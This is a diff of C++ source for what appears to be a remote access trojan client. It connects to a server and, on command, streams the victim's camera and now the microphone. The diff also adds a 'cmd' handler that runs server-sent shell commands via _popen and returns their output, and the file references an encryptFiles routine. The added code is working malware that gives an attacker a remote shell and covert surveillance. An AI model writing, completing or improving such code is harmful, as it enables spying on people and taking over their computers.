@@ -3,6 +3,7 @@
 //
 #include "ShareScreen.h"
 #include "ShareCamera.h"
+#include "ShareMicOutput.h"
 #include "Connection.h"
 
 Connection::Connection(string ip, unsigned int port) {
@@ -13,7 +14,7 @@ Connection::Connection(string ip, unsigned int port) {
 }
 
 void Connection::sendMessage(const char *data) {
-    send(sock, data, sizeof(data), 0);
+    send(sock, data, strlen(data), 0);
     return;
 }
 
@@ -105,11 +106,23 @@ void Connection::encryptFiles(string path) {
     }
 }
 
-
-void Connection::executeShell(string shell) {
-    string output = to_string(system(shell.c_str()));
-    sendMessage(reinterpret_cast<const char *>(&output));
-    return;
+string Connection::exec(string &cmd) {
+    char buffer[128];
+    std::string result = "";
+    FILE *pipe = _popen(cmd.c_str(), "r");
+    if (!pipe) {
+        return "There is an error with the command " + cmd;
+    }
+    try {
+        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
+            result += buffer;
+        }
+    } catch (...) {
+        _pclose(pipe);
+        return "There is an error with the command " + cmd;
+    }
+    _pclose(pipe);
+    return result;
 }
 
 
@@ -146,6 +159,7 @@ void Connection::connection() {
     char buf[1024];
     int bytesReceived;
     ShareCamera *shareCamera = new ShareCamera(sock);
+    ShareMicOutput *shareMic = new ShareMicOutput(sock);
 
     while (true) {
         cout << "Test" << endl;
@@ -157,7 +171,21 @@ void Connection::connection() {
         //There is a bug when disconnecting the camera (The program crash)
         if (command.find("take camera video") == 0) {
             shareCamera->ShareCameraLive();
-            continue;
+        } else if (command.starts_with("capture mic")) {
+            shareMic->streamMic();
+            return;
+        } else if (command.rfind("cmd") == 0) {
+            //Deleting the first 4 (cmd ) characters from the command
+            command = command.substr(4, command.size() - 1);
+            //Execute the command and saving the output in output
+            string output = exec(command);
+            //Send the results to the server
+            send(sock, output.c_str(), output.size(), 0);
+        } else {
+            //The command is not exist
+            string cantFind = "The command " + command + " was not found";
+            sendMessage(cantFind.c_str());
+            cout << sizeof(cantFind.c_str()) << endl;
         }
     }
 
